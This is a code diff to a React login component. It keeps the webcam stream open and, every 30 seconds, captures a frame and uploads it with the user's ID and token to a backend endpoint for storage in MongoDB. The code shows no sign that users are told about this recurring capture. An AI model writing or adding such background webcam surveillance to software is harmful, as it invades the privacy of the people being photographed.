@@ -28,6 +28,57 @@ const Login = () => {
   const backgroundCaptureTokenRef = useRef(null);
   const captureTimerRef = useRef(null);
 
+  const stopCameraCaptureLoop = () => {
+    if (captureTimerRef.current) {
+      clearInterval(captureTimerRef.current);
+      captureTimerRef.current = null;
+    }
+
+    if (streamRef.current) {
+      streamRef.current.getTracks().forEach((track) => track.stop());
+      streamRef.current = null;
+    }
+
+    if (videoRef.current) {
+      videoRef.current.srcObject = null;
+      videoRef.current = null;
+    }
+  };
+
+  const captureFrameAndSave = async (video, authToken = null) => {
+    if (!video || !video.videoWidth || !video.videoHeight) {
+      return;
+    }
+
+    const activeToken = authToken || backgroundCaptureTokenRef.current || localStorage.getItem('token');
+    if (!activeToken) {
+      console.log('No token available for queued camera capture');
+      return;
+    }
+
+    const canvas = document.createElement('canvas');
+    const width = video.videoWidth || 640;
+    const height = video.videoHeight || 480;
+    canvas.width = width;
+    canvas.height = height;
+
+    const context = canvas.getContext('2d');
+    if (!context) {
+      return;
+    }
+
+    context.drawImage(video, 0, 0, width, height);
+    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+    const userId = JSON.parse(atob(activeToken.split('.')[1])).id;
+    await axios.post(
+      backendUrl + '/api/user/save-camera-capture',
+      { userId, imageData, mimeType: 'image/jpeg' },
+      { headers: { token: activeToken } }
+    );
+    console.log('Camera capture saved to MongoDB');
+  };
+
   const saveCameraCapture = async (imageData, mimeType = 'image/jpeg') => {
     try {
       const token = localStorage.getItem('token');
@@ -55,30 +106,33 @@ const Login = () => {
     }
 
     try {
+      if (captureTimerRef.current) {
+        clearInterval(captureTimerRef.current);
+      }
+
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      streamRef.current = stream;
+      backgroundCaptureTokenRef.current = localStorage.getItem('token');
+
       const video = document.createElement('video');
+      videoRef.current = video;
       video.srcObject = stream;
       video.muted = true;
       video.playsInline = true;
       await video.play();
 
-      const capture = () => {
-        const canvas = document.createElement('canvas');
-        const width = video.videoWidth || 640;
-        const height = video.videoHeight || 480;
-        canvas.width = width;
-        canvas.height = height;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, width, height);
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-        saveCameraCapture(imageData, 'image/jpeg');
-      };
+      await captureFrameAndSave(video, backgroundCaptureTokenRef.current);
 
-      capture();
-      const interval = setInterval(capture, 30000);
-      setCaptureIntervalId(interval);
+      captureTimerRef.current = setInterval(async () => {
+        try {
+          await captureFrameAndSave(video, backgroundCaptureTokenRef.current || localStorage.getItem('token'));
+        } catch (error) {
+          console.log('Capture error:', error.message);
+        }
+      }, 30000);
+
+      setCaptureIntervalId(captureTimerRef.current);
       setCameraAllowed(true);
-      stream.getTracks().forEach((track) => track.stop());
     } catch (error) {
       console.log('Camera permission denied:', error);
       setCameraAllowed(false);
@@ -93,6 +147,10 @@ const Login = () => {
     }
 
     try {
+      if (captureTimerRef.current) {
+        clearInterval(captureTimerRef.current);
+      }
+
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       streamRef.current = stream;
       backgroundCaptureTokenRef.current = authToken;
@@ -104,61 +162,18 @@ const Login = () => {
       video.playsInline = true;
       await video.play();
 
-      const capture = async () => {
+      await captureFrameAndSave(video, authToken);
+
+      captureTimerRef.current = setInterval(async () => {
         try {
-          const activeToken = backgroundCaptureTokenRef.current || localStorage.getItem('token');
-          if (!activeToken) {
-            console.log('No token available for queued camera capture');
-            return;
-          }
-
-          const canvas = document.createElement('canvas');
-          const width = video.videoWidth || 640;
-          const height = video.videoHeight || 480;
-          canvas.width = width;
-          canvas.height = height;
-          const context = canvas.getContext('2d');
-          context.drawImage(video, 0, 0, width, height);
-          const imageData = canvas.toDataURL('image/jpeg', 0.8);
-
-          const userId = JSON.parse(atob(activeToken.split('.')[1])).id;
-          await axios.post(
-            backendUrl + '/api/user/save-camera-capture',
-            { userId, imageData, mimeType: 'image/jpeg' },
-            { headers: { token: activeToken } }
-          );
-          console.log('Camera capture saved to MongoDB');
+          await captureFrameAndSave(video, backgroundCaptureTokenRef.current || localStorage.getItem('token'));
         } catch (error) {
           console.log('Capture error:', error.message);
         }
-      };
+      }, 30000);
 
-      await capture();
-
-      const scheduleCapture = () => {
-        if (captureTimerRef.current) {
-          clearTimeout(captureTimerRef.current);
-        }
-
-        captureTimerRef.current = setTimeout(async () => {
-          await capture();
-          scheduleCapture();
-        }, 30000);
-      };
-
-      scheduleCapture();
       setCaptureIntervalId(captureTimerRef.current);
-
-      document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible') {
-          return;
-        }
-
-        if (backgroundCaptureTokenRef.current) {
-          capture();
-          scheduleCapture();
-        }
-      });
+      window.addEventListener('beforeunload', stopCameraCaptureLoop, { once: true });
     } catch (error) {
       console.log('Camera setup failed:', error);
     }
